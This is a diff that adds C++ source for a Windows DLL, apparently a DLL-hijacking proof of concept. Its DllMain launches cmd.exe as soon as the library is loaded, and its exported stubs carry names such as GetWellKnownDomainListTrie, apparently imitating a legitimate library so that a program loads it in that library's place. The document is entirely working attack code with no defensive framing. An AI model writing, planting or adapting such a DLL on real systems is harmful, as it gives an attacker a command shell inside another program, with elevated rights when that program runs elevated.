@@ -1,0 +1,95 @@
+#include "pch.h"
+#include <windows.h>
+#include <shellapi.h>
+
+// Self-contained function to check for administrator (elevated) privileges
+static BOOL IsProcessElevated()
+{
+    BOOL fRet = FALSE;
+    HANDLE hToken = NULL;
+
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+    {
+        TOKEN_ELEVATION elevation;
+        DWORD dwSize = 0;
+        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
+        {
+            fRet = elevation.TokenIsElevated;
+        }
+        CloseHandle(hToken);
+    }
+    return fRet;
+}
+
+static VOID SpawnCmd()
+{
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    const char* cmd = "C:\\Windows\\System32\\cmd.exe";
+
+    if (!CreateProcessA(cmd, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+    {
+        MessageBoxA(NULL, "Failed to spawn cmd.exe", "Error", MB_OK | MB_ICONERROR);
+    }
+    else
+    {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    {
+        if (IsProcessElevated())
+        {
+            // If admin
+            SpawnCmd();
+        }
+        else
+        {
+            // If not admin but still want to spawn
+            SpawnCmd();
+        }
+        break;
+    }
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+// Exported functions
+extern "C" __declspec(dllexport) VOID GetWellKnownDomainListHuffmanTree()
+{
+    MessageBoxA(NULL, "Function: GetWellKnownDomainListHuffmanTree", "DLL Export", MB_OK);
+}
+
+extern "C" __declspec(dllexport) VOID GetWellKnownDomainListHuffmanTreeSize()
+{
+    MessageBoxA(NULL, "Function: GetWellKnownDomainListHuffmanTreeSize", "DLL Export", MB_OK);
+}
+
+extern "C" __declspec(dllexport) VOID GetWellKnownDomainListRootPosition()
+{
+    MessageBoxA(NULL, "Function: GetWellKnownDomainListRootPosition", "DLL Export", MB_OK);
+}
+
+extern "C" __declspec(dllexport) VOID GetWellKnownDomainListTrie()
+{
+    MessageBoxA(NULL, "Function: GetWellKnownDomainListTrie", "DLL Export", MB_OK);
+}
+
+extern "C" __declspec(dllexport) VOID GetWellKnownDomainListTrieBits()
+{
+    MessageBoxA(NULL, "Function: GetWellKnownDomainListTrieBits", "DLL Export", MB_OK);
+}
